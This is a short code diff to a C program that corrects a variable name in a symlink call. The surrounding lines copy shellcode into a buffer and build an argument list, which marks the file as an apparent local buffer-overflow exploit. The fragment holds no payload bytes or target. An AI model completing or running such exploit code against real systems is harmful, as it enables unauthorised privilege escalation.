@@ -41,7 +41,7 @@ int main(void) {
     *(ptr++) = shellcode[i];
 
   buff[BUFFER_SIZE - 1] = '\0';
-  symlink(TARGET,buf);
+  symlink(TARGET,buff);
 
   // another way
   args[0] = buff; args[1] = "-h";
